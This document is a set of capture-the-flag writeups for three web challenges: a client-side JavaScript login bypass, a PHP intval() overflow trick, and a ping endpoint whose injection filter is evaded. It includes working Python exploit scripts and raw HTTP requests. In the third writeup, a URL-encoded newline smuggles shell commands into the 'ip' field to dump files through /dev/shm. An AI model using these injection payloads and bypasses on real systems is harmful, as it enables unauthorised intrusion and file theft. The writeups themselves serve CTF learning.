# Global Redirect

## Overview
This writeup details the exploitation of a client-side authentication bypass in a web application. By analyzing the page source, we can directly access a hidden endpoint and retrieve the flag.

## Analysis
Upon viewing the page source, we find the following JavaScript code responsible for authentication:

```javascript
<script>
      function loginAuthenticate(){
        var password = document.getElementById("password");
        var hash = sjcl.hash.sha256.hash(password);
        var hexRepresentation = sjcl.codec.hex.fromBits(hash);
        if (hexRepresentation == "2a70282a868c0ca9e6fe5bb5cf2ac2ea6b523062102bada26fb87091d511e3f1"){
          alert("welcome Home Admin");
          window.location = "./0078f62f00305b73de6ccace8f9fc1f68a8f1dcec865d33fcacbaf255ddefaa7";
        }else{
          alert("Incorrect Password. Please Try Again");
        }
        alert(hash);
      }
</script>
```

### Exploit Strategy
- The authentication mechanism relies on JavaScript, meaning it can be bypassed.
- The password is hashed using SHA-256 and compared with a hardcoded hash.
- If the hash matches, the user is redirected to `./0078f62f00305b73de6ccace8f9fc1f68a8f1dcec865d33fcacbaf255ddefaa7`.
- Instead of brute-forcing the password, we can directly navigate to the endpoint.

## Exploit Execution
Using Python and the `requests` module, we can fetch the contents of the hidden endpoint and extract the flag:

```python
import requests
import re

url = "http://chal.bearcatctf.io:39724/0078f62f00305b73de6ccace8f9fc1f68a8f1dcec865d33fcacbaf255ddefaa7"

response = requests.get(url)

flag_match = re.search(r'BCCTF\{.*?\}', response.text)

if flag_match:
    print(flag_match.group(0))  # Prints only the flag
else:
    print("Flag not found!")
```
---

# Numberizer Exploit

## Overview
This writeup explains how we exploit a PHP-based number validation logic to obtain a flag. The vulnerability lies in how the program processes numeric inputs, allowing us to manipulate them to achieve an unintended negative sum.

## Analysis
Examining the PHP code:

```php
<?php
ini_set("error_reporting", 0);

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "flag.php";

$MAX_NUMS = 5;

if(isset($_POST['numbers']) && is_array($_POST['numbers'])) {

    $numbers = array();
    $sum = 0;
    for($i = 0; $i < $MAX_NUMS; $i++) {
        if(!isset($_POST['numbers'][$i]) || strlen($_POST['numbers'][$i])>4 || !is_numeric($_POST['numbers'][$i])) {
            continue;
        }
        $the_number = intval($_POST['numbers'][$i]);
        if($the_number < 0) {
            continue;
        }
        $numbers[] = $the_number;
    }
    $sum = intval(array_sum($numbers));

    if($sum < 0) {
        echo "You win a flag: $FLAG";
    } else {
        echo "You win nothing with number $sum ! :-(";
    }
}
?>
```

### Exploit Strategy
- The program processes an array of numbers submitted via `POST`.
- It checks if values are numeric and restricts input length to 4 characters.
- It converts numbers using `intval()`, which processes certain inputs incorrectly.
- The sum must be negative to obtain the flag.

## Exploit Execution
We exploit the behavior of `intval()` with scientific notation. `intval("9e99")` evaluates to a very large positive integer, but when summed, it can cause an integer overflow, resulting in a negative sum.

```python
import requests
import re

url = "http://52.59.124.14:5004/"

data = {
    "numbers[]": ["9e99", "9e99", "9e99", "9e99", "9e99"]
}

response = requests.post(url, data=data)

flag_match = re.search(r'ENO\{.*?\}', response.text)

if flag_match:
    print(flag_match.group(0))  # Prints only the flag
else:
    print("Flag not found!")
```

---

# Unhealth 2: The Sequel Exploit

## Overview
This challenge involves bypassing a security mechanism that detects command injection attempts. By leveraging indirect file writing and retrieval, we successfully extract the flag.

## Analysis
- The `/health-check` endpoint accepts a `POST` request with an `ip` parameter.
- Sending a normal `ping` request to an IP returns output.
- Command injection attempts (e.g., `ip=127.0.0.2; cat /flag.txt`) are blocked, triggering `HACKING DETECTED`.
- However, by writing command output to `/dev/shm/` (a temporary filesystem), we can later retrieve the flag.

## Exploit Execution
### Step 1: Write file contents to `/dev/shm/`
```http
POST /health-check HTTP/1.1
Host: chal.bearcatctf.io:30812
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1%0A%20cat%20%2f*%20%3E%20%2Fdev%2Fshm%2Fcontents1.txt
```

### Step 2: Retrieve the contents
```http
POST /health-check HTTP/1.1
Host: chal.bearcatctf.io:30812
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1%0A%20cat%20%2Fdev%2Fshm%2Fcontents1.txt
```

